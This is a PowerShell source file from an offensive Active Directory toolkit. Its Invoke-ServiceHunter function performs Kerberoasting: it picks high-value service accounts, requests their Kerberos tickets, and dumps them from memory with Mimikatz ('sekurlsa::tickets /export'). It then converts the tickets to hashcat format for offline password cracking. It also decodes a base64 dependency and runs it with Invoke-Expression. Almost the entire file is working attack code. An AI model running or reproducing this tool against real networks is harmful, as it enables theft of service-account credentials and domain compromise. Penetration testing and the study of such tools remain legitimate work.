function Convert-KirbiToHashcat
{
<#
.SYNOPSIS

Convert-KirbiToHashcat converts an exported Kerberos ticket from mimikatz (.kirbi) to a text file, which is compatible with hashcat.

Author: Christoph Falta (@cfalta)

.DESCRIPTION

Convert-KirbiToHashcat is a simple script that leverages the ASN1 class from Mono.Security to decode the Kerberos ticket and create a new text file with the necessary contents so it can be cracked with Hashcat.

The Mono.Security.dll is stored in this script as a Base64 encoded string and will be dynamically decoded during runtime.

.PARAMETER Path

The path to a single ".kirbi" file to convert. This parameter is mandatory.

.PARAMETER MonoDLL

The path to the "Mono.Security.dll". This can be used to load the DLL from an alternate location.

.EXAMPLE

Convert-KirbiToHashcat -Path C:\temp\ticket.kirbi

Description
-----------

This will load the .kirbi file from the specified location, convert it and create the new file C:\temp\ticket.hashcat.

.EXAMPLE

Convert-KirbiToHashcat -Path C:\temp\ticket.kirbi -MonoDLL C:\temp\Mono.Security.dll

Description
-----------

Same example as before, but this time the Mono DLL will be loaded from C:\temp\Mono.Security.dll


.NOTES

Mono Reference, http://docs.go-mono.com/?link=T%3aMono.Security.ASN1

.LINK

https://github.com/cfalta/ADT

#>

    [CmdletBinding()] Param (
        [Parameter(Position = 0, Mandatory = $True)]
        [ValidateNotNullorEmpty()]
        [String]
        $Path,

        [Parameter(Position = 1, Mandatory = $False)]
        [ValidateNotNullorEmpty()]
        [String]
        $MonoDLL
    )

#If a custom MonoDLL should not be used, use the encoded version stored in this script
if($MonoDLL)
{
    $MonoDLLBytes = Get-Content -Encoding Byte -Path $MonoDLL
}
else
{
    #This is a Base64 encoded version of the Mono.Security.dll version 4.0.0.0
    $EncodedMonoDLL = ""

    #Decode the DLL as byte array
    $MonoDLLBytes = [System.Convert]::FromBase64String($EncodedMonoDLL)
}

#Load Mono DLL and create new ASN1 instance
$Assembly = [System.Reflection.Assembly]::Load($MonoDLLBytes)
$ASN1Instance = New-Object Mono.Security.ASN1

#Load content of kirbi file in byte array
[byte[]]$FileBytes = Get-Content -LiteralPath $Path -Encoding Byte

#Initialize ASN1 instance with file content
$null = $ASN1Instance.Add($FileBytes)

#Create encoding object for string decoding
$Encoding = [System.Text.Encoding]::UTF8

#Extract main content from ticket
$Content = ([System.BitConverter]::ToString($ASN1Instance[0][0][2][0][0][0][3][0][2][0].value)).Replace("-","")
$Content = ($Content.Substring(0,32) + "$" + $Content.Substring(32))

#Extract realm and SPN from ticket
$Realm = $Encoding.GetString($ASN1Instance[0][0][2][0][0][0][1][0].Value)
$SPNPart1 = $Encoding.GetString($ASN1Instance[0][0][2][0][0][0][2][0][1][0][0].Value)
$SPNPart2 = $Encoding.GetString($ASN1Instance[0][0][2][0][0][0][2][0][1][0][1].Value)
$SPN = $SPNPart1 + "/" + $SPNPart2

#Create result string in correct format for hashcat
$ResultString = '$krb5tgs$23$*user$' + $Realm + "$" + $SPN + "*$" + $Content

#Save result string in file
$ResultFile = ($Path.Substring(0,($Path.LastIndexOf("."))) + ".hashcat")
$ResultFile = (($ResultFile.Replace('[','')).Replace(']','')).Replace(';','')

Set-Content -LiteralPath $ResultFile -Value $ResultString -Force
}

function Invoke-ServiceHunter
{
<#
.SYNOPSIS

Invoke-ServiceHunter requests Kerberos tickets for Service Accounts in AD and exports these tickets in a Hashcat compatible format for cracking.

Author: Christoph Falta (@cfalta)
Required Dependencies: Invoke-Mimikatz (from the Powersploit Suite)

.DESCRIPTION

Invoke-ServiceHunter uses Invoke-Profiler to get a list of weighted Service Accounts. Invoke-Profiler uses a simple scoring model to identify the accounts most vulnerable and with the highest impact in case of success.
Afterwards, the script requests a Kerberos ticket for each Service Account, exports the tickets via Invoke-Mimikatz and converts them into text files that can be cracked with Hashcat.

.PARAMETER Target

The Service Account(s) to target. This can either be set manually by entering an account name or the Top 5 accounts can be dynamically retrieved via Invoke-Profiler. The default mode is "TOP5" in case nothing is set.
You can also attack all service accounts with SPNs by setting the target parameter to "ALL".

.PARAMETER OutputDirectory

The directory in which the crackable Hashcat files should be stored. Default is the current directory.

.PARAMETER FromFile

The path to a CSV file that contains the user information from Active Directory. If "FromFile" is used, Invoke-ServiceHunter will not query Active Directory to find suitable Service Accounts but will use the information in the CSV file instead.
The CSV file should be the "UserProfile.csv" from the "Invoke-Profiler -OutCsv" command.

.EXAMPLE

Invoke-ServiceHunter

Description
-----------

Without any parameters, the script will default to target the TOP5 service account list and store the results in the current directory.

.EXAMPLE

Invoke-ServiceHunter -FromFile C:\temp\UserProfile.csv

Description
-----------

As the previous example, this will also target the TOP5 service accounts by default but will not query AD for the user information. Instead, suitable service accounts will be identified by the information in the CSV file.

.EXAMPLE

Invoke-ServiceHunter -Target backupexec -OutputDirectory C:\temp\

Description
-----------

This will target the account with the name "backupexec" only and store the result in "C:\temp\".

.NOTES

This script uses Invoke-Mimikatz from the PowerSploit framework.

.LINK

https://github.com/cfalta/ADT

#>

    [CmdletBinding()] Param (
        [Parameter(Position = 0)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Target = "TOP5",

        [Parameter(Position = 1)]
        [ValidateNotNullOrEmpty()]
        [ValidateScript({ Test-Path $_ })]
        [String]
        $OutputDirectory = (Get-Location),

        [Parameter(Position = 2)]
        [ValidateNotNullOrEmpty()]
        [ValidateScript({ Test-Path $_ })]
        [String]
        $FromFile
    )

#Set default values for control variables
$ScriptRequirements = $True

#Resolve external dependencies
$Dependencies = @("Invoke-Mimikatz")

foreach($D in $Dependencies)
{
    $Encoded = Get-ExternalDependency($D)
    [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($Encoded)) | Invoke-Expression
}

#A function to request Kerberos tickets natively via .NET
function Get-Tickets($SvcAccounts)
{
    Add-Type -AssemblyName System.IdentityModel

    foreach($Svc in $SvcAccounts)
    {
        Write-Verbose ("Requesting Kerberos Ticket for " + $Svc.SPN)
        try
        {
            $null = [System.IdentityModel.Tokens.KerberosRequestorSecurityToken]($Svc.SPN)
            Write-Verbose ("Successfully requested Kerberos ticket for " + $Svc.SPN)
        }
        catch
        {
            Write-Warning ("Error requesting Kerberos ticket for " + $Svc.SPN)
        }
    }

}

#A function to export all tickets from memory using mimikatz
function Export-Tickets()
{
   Write-Verbose "Dumping Kerberos tickets from memory"

   $null = Invoke-Mimikatz -command '"privilege::debug" "sekurlsa::tickets /export" "exit"' -Verbose:$False
}

#A function to convert the tickets into Hashcat compatible format
function Convert-Tickets($SvcAccounts)
{
    Write-Verbose "Converting Kerberos tickets to hashcat compatible format"

    #Foreach service account we requested, check if there is a .kirib file in the working directory
    foreach($Svc in $SvcAccounts)
    {
        #Some characters have to be replaced, because they cannot be used in file names
        $MatchString = ($Svc.SPN.Replace("/","-")).Replace(":","~")
        $MatchString = ("*" + $MatchString + "*")

        $TicketFile = Get-ChildItem -LiteralPath $WorkingDirectory -Filter *.kirbi | ? {$_.Name -like $MatchString}

        $NewFileName = Join-Path $WorkingDirectory ("kerbtgs_" + $Svc.samAccountName + ".kirbi")
        $null = Rename-Item -LiteralPath $TicketFile -NewName $NewFileName

        $TicketFile = Get-Childitem -LiteralPath $NewFileName

        Convert-KirbiToHashcat -Path $TicketFile.Fullname
    }

    #Move all .hashcat files to the target directory
    Get-ChildItem -Path $WorkingDirectory -Filter *.hashcat | Move-Item -Destination $OutputDirectory -Force
}

#The main script execution starts here

#Check if the user has local admin rights

if(-Not (Confirm-LocalAdmin))
{
    Write-Verbose "Local Admin rights are needed. Please elevate powershell and try again."
    $ScriptRequirements = $False
}

if($FromFile)
{
    try
    {
        $UserAccounts = Import-Csv -LiteralPath $FromFile -ErrorAction Stop
        Write-Verbose ("CSV import successful: " + $FromFile)
    }
    catch
    {
        Write-Verbose "CSV import failed. Check filepath and try again."
        $ScriptRequirements = $False
    }
}

if($ScriptRequirements)
{
    if(-Not ($UserAccounts))
    {
        Write-Verbose "Retrieving user information from Active Directory. Be patient, this can take some time in large environments!"
        $UserAccounts = Invoke-Profiler -Profile User
    }

    #Evaluate user choice and populate variable with service accounts
    switch($Target)
    {
        ALL { 
                    #Get all service accounts
                    $SvcAccounts = $UserAccounts | ? { ($_.SPN -ne $False) -and ($_.isDisabled -eq $False) -and ($_.SAMAccountName -ne "krbtgt") }              
             }

        TOP5 { 
                    #Get only the TOP5 service accounts by score
                    $SvcAccounts = $UserAccounts | ? { ($_.SPN -ne $False) -and ($_.isDisabled -eq $False) -and ($_.SAMAccountName -ne "krbtgt") } | Sort-Object -Property Score,PasswordLastSetDays -Descending | Select-Object -First 5
             }


        default {             
                    $SvcAccounts = $UserAccounts | ? { $_.samAccountName -eq $Target }
                }
    }

    #If a target service account exists, proceed
    if($SvcAccounts)
    {
        $StartDirectory = Get-Location

        $WorkingDirectory = New-WorkingDirectory

        Set-Location -LiteralPath $WorkingDirectory

        Get-Tickets($SvcAccounts)

        Export-Tickets

        Convert-Tickets($SvcAccounts)

        Set-Location -LiteralPath $StartDirectory

        Remove-WorkingDirectory($WorkingDirectory)
    }
    else
    {
        Write-Verbose "Target does not exist or has no SPN configured."
    }
}
}